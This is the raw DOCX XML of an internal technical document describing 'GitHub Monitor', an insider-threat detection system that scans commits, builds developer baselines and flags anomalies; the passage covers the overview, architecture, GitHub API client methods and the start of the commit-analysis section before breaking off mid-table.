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1A2E"/>
          <w:sz w:val="64"/>
        </w:rPr>
        <w:t>GitHub Monitor</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="4A4A6A"/>
          <w:sz w:val="36"/>
        </w:rPr>
        <w:t>Insider Threat Detection System</w:t>
        <w:br/>
        <w:t>Technical Document</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="888888"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>AppSec Platform</w:t>
        <w:br/>
        <w:t>Confidential - Internal Use Only</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Table of Contents</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>1. Executive Overview</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>2. System Architecture</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>3. Stage 1 - Repository Setup &amp; GitHub Integration</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>4. Stage 2 - Commit Scanning &amp; Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   4.1 Metadata Signal Detection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   4.2 SAST Rule Matching on Diff</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   4.3 Sensitive File Detection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   4.4 Binary File Detection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   4.5 Dependency Tampering Detection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   4.6 CI/CD Pipeline Tampering Detection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   4.7 Configuration Weakening Detection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   4.8 Suspicious Commit Messages</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   4.9 Risk Score Aggregation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>5. Stage 3 - Developer Behavioral Baselines</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   5.1 Baseline Metrics</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   5.2 Baseline Status Levels</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   5.3 Baseline Computation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>6. Stage 4 - Anomaly Detection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   6.1 Off-Hours Deviation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   6.2 Large Commit Size</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   6.3 Risk Spike</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>7. Stage 5 - AI Threat Assessment</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   7.1 Prompt Engineering</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   7.2 Threat Level Classification</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>8. Developer Risk Profiles</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>9. Dashboard &amp; Reporting</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>10. Database Schema</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>11. Integration with Other Platform Features</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>12. File Reference</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. Executive Overview</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The GitHub Monitor is an insider threat detection system integrated into the AppSec Platform. It continuously monitors GitHub repositories for risky commits, suspicious developer behavior, sensitive file exposure, supply chain attacks, and CI/CD pipeline tampering.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The system operates through a multi-layered analysis pipeline that combines static pattern matching, behavioral baselines with statistical anomaly detection, and AI-powered threat assessment to provide comprehensive insider threat visibility.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Key Capabilities</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Automated Commit Scanning: </w:t>
      </w:r>
      <w:r>
        <w:t>Every commit is analyzed against 10+ signal categories including SAST rules, sensitive file detection, dependency tampering, CI/CD manipulation, and configuration weakening.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Behavioral Baselines: </w:t>
      </w:r>
      <w:r>
        <w:t>Per-developer rolling baselines track commit timing, size, and risk patterns. Anomalies are detected using z-score analysis when commits deviate from established patterns.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">AI Threat Assessment: </w:t>
      </w:r>
      <w:r>
        <w:t>On-demand AI analysis provides intent classification (intentional insider, suspicious, negligent, false positive) with confidence scores, impact summaries, and recommended actions.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Developer Risk Profiles: </w:t>
      </w:r>
      <w:r>
        <w:t>Continuous risk scoring per developer with trend tracking (increasing, decreasing, stable) across all monitored repositories.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Supply Chain Protection: </w:t>
      </w:r>
      <w:r>
        <w:t>Detection of typosquatting packages, vulnerable version pinning, custom registry URLs, and removal of security dependencies.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">CI/CD Pipeline Security: </w:t>
      </w:r>
      <w:r>
        <w:t>Monitors for disabled security scans, secret exfiltration from CI environments, untrusted Docker base images, and deployment target changes.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. System Architecture</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The GitHub Monitor follows a 5-stage pipeline architecture:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="2D2D2D"/>
          <w:sz w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        </w:rPr>
        <w:t>PIPELINE OVERVIEW</w:t>
        <w:br/>
        <w:t>=================</w:t>
        <w:br/>
        <w:br/>
        <w:t>[Stage 1]  Repository Setup &amp; GitHub Integration</w:t>
        <w:br/>
        <w:t xml:space="preserve">    |       PAT authentication, repo validation, connection testing</w:t>
        <w:br/>
        <w:t xml:space="preserve">    v</w:t>
        <w:br/>
        <w:t>[Stage 2]  Commit Scanning &amp; Multi-Signal Analysis</w:t>
        <w:br/>
        <w:t xml:space="preserve">    |       10+ signal detectors, SAST rules, risk scoring</w:t>
        <w:br/>
        <w:t xml:space="preserve">    v</w:t>
        <w:br/>
        <w:t>[Stage 3]  Developer Behavioral Baselines</w:t>
        <w:br/>
        <w:t xml:space="preserve">    |       Rolling 60-commit window, timing/size/risk metrics</w:t>
        <w:br/>
        <w:t xml:space="preserve">    v</w:t>
        <w:br/>
        <w:t>[Stage 4]  Anomaly Detection</w:t>
        <w:br/>
        <w:t xml:space="preserve">    |       Z-score analysis, deviation flags, severity assignment</w:t>
        <w:br/>
        <w:t xml:space="preserve">    v</w:t>
        <w:br/>
        <w:t>[Stage 5]  AI Threat Assessment (On-Demand)</w:t>
        <w:br/>
        <w:t xml:space="preserve">            Intent classification, impact analysis, recommendations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Data Flow</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="2D2D2D"/>
          <w:sz w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        </w:rPr>
        <w:t>GitHub API                        AppSec Platform</w:t>
        <w:br/>
        <w:t>+-----------+                     +----------------------------+</w:t>
        <w:br/>
        <w:t>|  Commits  | ---PAT auth---&gt;    | GitHubClient               |</w:t>
        <w:br/>
        <w:t>|  Diffs    |                     |   get_recent_commits()     |</w:t>
        <w:br/>
        <w:t>|  Files    |                     |   get_commit_detail()      |</w:t>
        <w:br/>
        <w:t>+-----------+                     |   get_commit_diff()        |</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                  +----------+-----------------+</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                             |</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                             v</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                  +----------------------------+</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                  | CommitAnalyzer             |</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                  |   10 signal detectors      |</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                  |   SAST insider_threat rules|</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                  |   Risk score (0-10)        |</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                  +----------+-----------------+</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                             |</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                  +----------+-----------------+</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                  | BaselineEngine             |</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                  |   Per-developer baselines  |</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                  |   Z-score anomaly detection|</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                  +----------+-----------------+</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                             |</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                  +----------+-----------------+</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                  | AI Threat Assessment       |</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                  |   (on-demand per commit)   |</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                  |   Intent classification    |</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                  +----------------------------+</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. Stage 1 - Repository Setup &amp; GitHub Integration</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The first stage establishes connectivity to GitHub via a Personal Access Token (PAT) and allows users to add repositories for continuous monitoring.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>GitHub Client</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The GitHubClient class (services/github_client.py) provides an async REST API client for GitHub. It handles authentication, pagination, and rate limiting.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>API Methods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left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Method</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Purpose</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Endpoint</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>test_connection()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Validate PAT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET /user</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>get_repos(org)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>List org repositories</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET /orgs/{org}/repos</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>get_repo(owner, repo)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Get repo metadata</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET /repos/{owner}/{repo}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>get_recent_commits()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Commits since N hours</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET /repos/.../commits?since=</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>get_all_commits()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>All commits (paginated)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET /repos/.../commits</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>get_commit_detail()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Full commit with files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET /repos/.../commits/{sha}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>get_commit_diff()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Raw unified diff</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET /repos/.../commits/{sha} (diff header)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Repository Onboarding Flow</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. User enters GitHub PAT and default organization in Settings.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. System validates PAT by calling GET /user via test_connection().</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. User adds a repository by owner/repo name (e.g., "acme/web-app").</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>4. System validates the repository exists via get_repo().</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>5. Repository is stored in github_monitored_repos with active=1.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>6. User triggers initial scan ("Scan Now") or waits for scheduled scan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Settings Storage</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The GitHub PAT is stored in the platform Settings table with is_secret=True, under category "github". The default organization is stored as a separate setting.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. Stage 2 - Commit Scanning &amp; Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The CommitAnalyzer class (services/commit_analyzer.py, 705 lines) is the core analysis engine. Every commit is run through 10 independent signal detectors, and the results are aggregated into a risk score from 0-10.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Analysis Pipeline per Commit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="2D2D2D"/>
          <w:sz w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        </w:rPr>
        <w:t>For each commit:</w:t>
        <w:br/>
        <w:t xml:space="preserve">  1. Fetch commit detail (files, stats)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  2. Fetch unified diff</w:t>
        <w:br/>
        <w:t xml:space="preserve">  3. analyze_commit(commit_data, diff_text, is_force_push)</w:t>
        <w:br/>
        <w:t xml:space="preserve">     |</w:t>
        <w:br/>
        <w:t xml:space="preserve">     +-- _check_metadata_signals()    -&gt; off_hours, author_mismatch, unsigned</w:t>
        <w:br/>
        <w:t xml:space="preserve">     +-- Force push check             -&gt; force_push signal</w:t>
        <w:br/>
        <w:t xml:space="preserve">     +-- Large deletion check         -&gt; &gt;500 lines deleted</w:t>
        <w:br/>
        <w:t xml:space="preserve">     +-- _scan_diff()                 -&gt; SAST insider_threat rules</w:t>
        <w:br/>
        <w:t xml:space="preserve">     +-- _check_sensitive_files()     -&gt; .env, keys, certs, etc.</w:t>
        <w:br/>
        <w:t xml:space="preserve">     +-- _check_commit_message()      -&gt; vague/empty on large commits</w:t>
        <w:br/>
        <w:t xml:space="preserve">     +-- _check_binary_files()        -&gt; .exe, .dll, .zip, .sql, etc.</w:t>
        <w:br/>
        <w:t xml:space="preserve">     +-- _check_dependency_tampering()-&gt; typosquat, vuln pinning</w:t>
        <w:br/>
        <w:t xml:space="preserve">     +-- _check_cicd_tampering()      -&gt; scan disabling, secret exfil</w:t>
        <w:br/>
        <w:t xml:space="preserve">     +-- _check_config_weakening()    -&gt; CORS, auth, TLS weakening</w:t>
        <w:br/>
        <w:t xml:space="preserve">     |</w:t>
        <w:br/>
        <w:t xml:space="preserve">     v</w:t>
        <w:br/>
        <w:t xml:space="preserve">  CommitAnalysisResult(risk_score, risk_level, signals, findings, sensitive_files)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 Metadata Signal Detection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The first layer of analysis examines commit metadata for behavioral red flags, without even looking at the code changes.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left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Signal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Detection Logic</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Risk Score</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
